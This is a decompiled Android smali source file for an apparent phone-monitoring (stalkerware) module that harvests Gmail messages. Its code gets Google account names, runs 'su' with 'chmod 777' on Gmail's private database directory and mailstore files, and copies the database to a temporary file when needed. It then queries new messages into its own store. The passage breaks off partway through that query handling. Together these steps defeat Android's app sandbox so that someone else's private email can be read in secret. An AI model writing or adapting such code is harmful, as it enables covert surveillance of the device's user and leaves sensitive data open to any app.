.class public Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;
.super Ljava/lang/Object;
.source "EmailListerUpTo51.java"

# interfaces
.implements Ljava/lang/Runnable;


# static fields
.field protected static final TAG:Ljava/lang/String; = "EmailMonitor::EmailListerUpTo51"

.field public static final TYPE_GOOGLE:Ljava/lang/String; = "com.google"

.field public static final TYPE_GOOGLE_LEGACY_IMAP:Ljava/lang/String; = "com.google.android.gm.legacyimap"


# instance fields
.field protected accounts:Ljava/util/ArrayList;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/ArrayList<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field protected context:Landroid/content/Context;

.field protected emailDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/EmailData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected fallbackDatabaseFile:Ljava/io/File;

.field protected log:Lcom/hp/vd/agent/log/IWriter;

.field protected moduleDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/ModuleData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected moduleData:Lcom/hp/vd/data/ModuleData;


# direct methods
.method public constructor <init>(Landroid/content/Context;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/agent/log/IWriter;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/data/ModuleData;)V
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/Context;",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/EmailData;",
            "Ljava/lang/Integer;",
            ">;",
            "Lcom/hp/vd/agent/log/IWriter;",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/ModuleData;",
            "Ljava/lang/Integer;",
            ">;",
            "Lcom/hp/vd/data/ModuleData;",
            ")V"
        }
    .end annotation

    .line 54
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const/4 v0, 0x0

    .line 33
    iput-object v0, p0, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->context:Landroid/content/Context;

    .line 34
    iput-object v0, p0, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->accounts:Ljava/util/ArrayList;

    .line 35
    iput-object v0, p0, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->emailDao:Lcom/j256/ormlite/dao/Dao;

    .line 36
    iput-object v0, p0, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->log:Lcom/hp/vd/agent/log/IWriter;

    .line 38
    iput-object v0, p0, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->moduleDao:Lcom/j256/ormlite/dao/Dao;

    .line 39
    iput-object v0, p0, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 41
    iput-object v0, p0, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->fallbackDatabaseFile:Ljava/io/File;

    .line 55
    iput-object p1, p0, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->context:Landroid/content/Context;

    .line 56
    iput-object p2, p0, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->emailDao:Lcom/j256/ormlite/dao/Dao;

    .line 57
    iput-object p3, p0, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->log:Lcom/hp/vd/agent/log/IWriter;

    .line 59
    iput-object p4, p0, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->moduleDao:Lcom/j256/ormlite/dao/Dao;

    .line 60
    iput-object p5, p0, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->moduleData:Lcom/hp/vd/data/ModuleData;

    return-void
.end method


# virtual methods
.method protected chmod(Ljava/lang/String;Z)Z
    .locals 3

    .line 332
    :try_start_0
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v0

    const-string v1, "su"

    invoke-virtual {v0, v1}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v0

    .line 333
    new-instance v1, Ljava/io/DataOutputStream;

    invoke-virtual {v0}, Ljava/lang/Process;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V

    if-nez p2, :cond_0

    .line 336
    new-instance p2, Ljava/lang/StringBuilder;

    invoke-direct {p2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "chmod 777 "

    invoke-virtual {p2, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p1, "\n"

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v1, p1}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    goto :goto_0

    .line 339
    :cond_0
    new-instance p2, Ljava/lang/StringBuilder;

    invoke-direct {p2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "chmod 777 -R "

    invoke-virtual {p2, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p1, "\n"

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v1, p1}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 342
    :goto_0
    invoke-virtual {v1}, Ljava/io/DataOutputStream;->flush()V

    const-string p1, "exit\n"

    .line 344
    invoke-virtual {v1, p1}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 345
    invoke-virtual {v1}, Ljava/io/DataOutputStream;->flush()V

    .line 347
    invoke-virtual {v0}, Ljava/lang/Process;->waitFor()I
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    const/4 p1, 0x1

    return p1

    :catch_0
    move-exception p1

    .line 355
    iget-object p2, p0, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v0, "EmailMonitor::EmailListerUpTo51"

    const-string v1, "chmod(): InterruptedException"

    invoke-interface {p2, v0, v1, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    goto :goto_1

    :catch_1
    move-exception p1

    .line 352
    iget-object p2, p0, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v0, "EmailMonitor::EmailListerUpTo51"

    const-string v1, "chmod(): IOException"

    invoke-interface {p2, v0, v1, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    :goto_1
    const/4 p1, 0x0

    return p1
.end method

.method public copy(Ljava/io/File;Ljava/io/File;)V
    .locals 7
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/io/IOException;
        }
    .end annotation

    .line 414
    new-instance v0, Ljava/io/FileInputStream;

    invoke-direct {v0, p1}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    .line 415
    new-instance p1, Ljava/io/FileOutputStream;

    invoke-direct {p1, p2}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    .line 417
    invoke-virtual {v0}, Ljava/io/FileInputStream;->getChannel()Ljava/nio/channels/FileChannel;

    move-result-object v1

    .line 418
    invoke-virtual {p1}, Ljava/io/FileOutputStream;->getChannel()Ljava/nio/channels/FileChannel;

    move-result-object v6

    .line 420
    invoke-virtual {v1}, Ljava/nio/channels/FileChannel;->size()J

    move-result-wide v4

    const-wide/16 v2, 0x0

    invoke-virtual/range {v1 .. v6}, Ljava/nio/channels/FileChannel;->transferTo(JJLjava/nio/channels/WritableByteChannel;)J

    .line 422
    invoke-virtual {v0}, Ljava/io/FileInputStream;->close()V

    .line 423
    invoke-virtual {p1}, Ljava/io/FileOutputStream;->close()V

    return-void
.end method

.method public findAccounts()Ljava/util/ArrayList;
    .locals 7
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()",
            "Ljava/util/ArrayList<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation

    .line 433
    iget-object v0, p0, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->context:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Landroid/accounts/AccountManager;->get(Landroid/content/Context;)Landroid/accounts/AccountManager;

    move-result-object v0

    invoke-virtual {v0}, Landroid/accounts/AccountManager;->getAccounts()[Landroid/accounts/Account;

    move-result-object v0

    .line 434
    new-instance v1, Ljava/util/ArrayList;

    invoke-direct {v1}, Ljava/util/ArrayList;-><init>()V

    const/4 v2, 0x0

    .line 436
    array-length v3, v0

    :goto_0
    if-ge v2, v3, :cond_2

    aget-object v4, v0, v2

    .line 437
    iget-object v5, v4, Landroid/accounts/Account;->type:Ljava/lang/String;

    const-string v6, "com.google"

    invoke-virtual {v5, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_0

    iget-object v5, v4, Landroid/accounts/Account;->type:Ljava/lang/String;

    const-string v6, "com.google.android.gm.legacyimap"

    invoke-virtual {v5, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_1

    .line 438
    :cond_0
    iget-object v4, v4, Landroid/accounts/Account;->name:Ljava/lang/String;

    invoke-virtual {v1, v4}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    :cond_1
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    :cond_2
    return-object v1
.end method

.method protected isReadable(Ljava/lang/String;)Z
    .locals 2

    const/4 v0, 0x0

    .line 316
    :try_start_0
    new-instance v1, Ljava/io/File;

    invoke-direct {v1, p1}, Ljava/io/File;-><init>(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    if-nez v1, :cond_0

    return v0

    .line 326
    :cond_0
    invoke-virtual {v1}, Ljava/io/File;->canRead()Z

    move-result p1

    return p1

    :catch_0
    return v0
.end method

.method protected openDatabase(Ljava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    .locals 7

    const/16 v0, 0x10

    const/4 v1, 0x0

    .line 366
    :try_start_0
    invoke-static {p1, v1, v0}, Landroid/database/sqlite/SQLiteDatabase;->openDatabase(Ljava/lang/String;Landroid/database/sqlite/SQLiteDatabase$CursorFactory;I)Landroid/database/sqlite/SQLiteDatabase;

    move-result-object v2
    :try_end_0
    .catch Landroid/database/sqlite/SQLiteException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v2

    .line 369
    iget-object v3, p0, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v4, "EmailMonitor::EmailListerUpTo51"

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "Exception caught while opening original database: "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-interface {v3, v4, v5, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    :try_start_1
    const-string v2, "emailMsgTemp"

    const-string v3, "db"

    .line 372
    invoke-static {v2, v3}, Ljava/io/File;->createTempFile(Ljava/lang/String;Ljava/lang/String;)Ljava/io/File;

    move-result-object v2

    iput-object v2, p0, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->fallbackDatabaseFile:Ljava/io/File;
    :try_end_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_3

    .line 380
    iget-object v2, p0, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->fallbackDatabaseFile:Ljava/io/File;

    if-nez v2, :cond_0

    .line 381
    iget-object p1, p0, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v0, "EmailMonitor::EmailListerUpTo51"

    const-string v2, "The newly created temporary database file is NULL!"

    const/4 v3, 0x3

    invoke-interface {p1, v0, v2, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return-object v1

    .line 387
    :cond_0
    :try_start_2
    new-instance v2, Ljava/io/File;

    invoke-direct {v2, p1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    iget-object p1, p0, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->fallbackDatabaseFile:Ljava/io/File;

    invoke-virtual {p0, v2, p1}, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->copy(Ljava/io/File;Ljava/io/File;)V
    :try_end_2
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_2

    .line 396
    :try_start_3
    iget-object p1, p0, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->fallbackDatabaseFile:Ljava/io/File;

    .line 397
    invoke-virtual {p1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object p1

    .line 396
    invoke-static {p1, v1, v0}, Landroid/database/sqlite/SQLiteDatabase;->openDatabase(Ljava/lang/String;Landroid/database/sqlite/SQLiteDatabase$CursorFactory;I)Landroid/database/sqlite/SQLiteDatabase;

    move-result-object v2
    :try_end_3
    .catch Landroid/database/sqlite/SQLiteException; {:try_start_3 .. :try_end_3} :catch_1

    :goto_0
    return-object v2

    :catch_1
    move-exception p1

    .line 403
    iget-object v0, p0, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "EmailMonitor::EmailListerUpTo51"

    const-string v3, "Cannot SQL open fallback database."

    invoke-interface {v0, v2, v3, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-object v1

    :catch_2
    move-exception p1

    .line 390
    iget-object v0, p0, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "EmailMonitor::EmailListerUpTo51"

    const-string v3, "Exception caught during coping database to a temporary location."

    invoke-interface {v0, v2, v3, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-object v1

    :catch_3
    move-exception p1

    .line 375
    iget-object v0, p0, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "EmailMonitor::EmailListerUpTo51"

    const-string v3, "Could not create a temporary database file."

    invoke-interface {v0, v2, v3, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-object v1
.end method

.method public run()V
    .locals 4

    .line 67
    :try_start_0
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->runUnsafe()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    .line 70
    iget-object v1, p0, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "EmailMonitor::EmailListerUpTo51"

    const-string v3, "run(): Exception caught in runUnsafe()"

    invoke-interface {v1, v2, v3, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    :goto_0
    return-void
.end method

.method protected runUnsafe()V
    .locals 13

    .line 81
    :try_start_0
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->findAccounts()Ljava/util/ArrayList;

    move-result-object v0

    iput-object v0, p0, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->accounts:Ljava/util/ArrayList;
    :try_end_0
    .catch Ljava/lang/NullPointerException; {:try_start_0 .. :try_end_0} :catch_7
    .catch Ljava/lang/RuntimeException; {:try_start_0 .. :try_end_0} :catch_6

    .line 94
    iget-object v0, p0, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->accounts:Ljava/util/ArrayList;

    if-eqz v0, :cond_10

    iget-object v0, p0, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->accounts:Ljava/util/ArrayList;

    invoke-virtual {v0}, Ljava/util/ArrayList;->isEmpty()Z

    move-result v0

    if-eqz v0, :cond_0

    goto/16 :goto_3

    .line 101
    :cond_0
    iget-object v0, p0, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->accounts:Ljava/util/ArrayList;

    invoke-virtual {v0}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object v0

    :cond_1
    :goto_0
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    move-result v1

    if-eqz v1, :cond_e

    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Ljava/lang/String;

    const-string v2, "/data/data/com.google.android.gm/databases/"

    .line 103
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, "mailstore."

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, ".db"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    .line 109
    iget-object v4, p0, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v5, "EmailMonitor::EmailListerUpTo51"

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "Checking path: "

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-interface {v4, v5, v6}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 111
    invoke-virtual {p0, v2}, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->isReadable(Ljava/lang/String;)Z

    move-result v4

    const/4 v5, 0x0

    if-nez v4, :cond_2

    .line 112
    invoke-virtual {p0, v2, v5}, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->chmod(Ljava/lang/String;Z)Z

    move-result v4

    if-nez v4, :cond_2

    .line 113
    iget-object v4, p0, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v6, "EmailMonitor::EmailListerUpTo51"

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "Cannot chmod 777: "

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-interface {v4, v6, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 117
    :cond_2
    invoke-virtual {p0, v3}, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->isReadable(Ljava/lang/String;)Z

    move-result v2

    if-nez v2, :cond_3

    .line 118
    invoke-virtual {p0, v3, v5}, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->chmod(Ljava/lang/String;Z)Z

    move-result v2

    if-nez v2, :cond_3

    .line 119
    iget-object v2, p0, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v4, "EmailMonitor::EmailListerUpTo51"

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "Cannot chmod 777: "

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-interface {v2, v4, v6}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 127
    :cond_3
    new-instance v2, Ljava/io/File;

    invoke-direct {v2, v3}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 129
    invoke-virtual {v2}, Ljava/io/File;->isFile()Z

    move-result v4

    const/4 v6, 0x3

    if-nez v4, :cond_4

    .line 130
    iget-object v1, p0, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "EmailMonitor::EmailListerUpTo51"

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "Database file is not a file at:"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-interface {v1, v2, v3, v6}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    goto/16 :goto_0

    .line 135
    :cond_4
    invoke-virtual {v2}, Ljava/io/File;->exists()Z

    move-result v4

    if-nez v4, :cond_5

    .line 136
    iget-object v1, p0, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "EmailMonitor::EmailListerUpTo51"

    const-string v3, "Database file does not exist."

    invoke-interface {v1, v2, v3, v6}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    goto/16 :goto_0

    .line 141
    :cond_5
    invoke-virtual {v2}, Ljava/io/File;->length()J

    move-result-wide v7

    const-wide/16 v9, 0x0

    cmp-long v2, v7, v9

    if-nez v2, :cond_6

    .line 142
    iget-object v1, p0, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "EmailMonitor::EmailListerUpTo51"

    const-string v3, "Database file is 0L long."

    invoke-interface {v1, v2, v3, v6}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    goto/16 :goto_0

    .line 151
    :cond_6
    invoke-virtual {p0, v3}, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->openDatabase(Ljava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;

    move-result-object v2

    if-nez v2, :cond_7

    .line 154
    iget-object v0, p0, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "EmailMonitor::EmailListerUpTo51"

    const-string v2, "Cannot open database. Exiting..."

    invoke-interface {v0, v1, v2, v6}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return-void

    .line 165
    :cond_7
    iget-object v3, p0, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->context:Landroid/content/Context;

    invoke-virtual {v3}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "max_id_"

    invoke-virtual {v4, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4, v5}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v3

    .line 169
    invoke-interface {v3}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v4

    .line 171
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "max_id_"

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    const/4 v8, -0x1

    invoke-interface {v3, v7, v8}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v3

    if-ne v3, v8, :cond_8

    .line 174
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "max_id_"

    invoke-virtual {v3, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-interface {v4, v3, v5}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 177
    invoke-interface {v4}, Landroid/content/SharedPreferences$Editor;->commit()Z

    move v3, v5

    .line 180
    :cond_8
    iget-object v7, p0, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v8, "EmailMonitor::EmailListerUpTo51"

    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    const-string v10, "max_id_"

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v10, " === "

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-interface {v7, v8, v9}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 186
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "SELECT m.* FROM messages m WHERE m._id > "

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    const/4 v7, 0x0

    .line 197
    :try_start_1
    invoke-virtual {v2, v3, v7}, Landroid/database/sqlite/SQLiteDatabase;->rawQuery(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v3
    :try_end_1
    .catch Landroid/database/sqlite/SQLiteException; {:try_start_1 .. :try_end_1} :catch_3

    if-nez v3, :cond_9

    .line 206
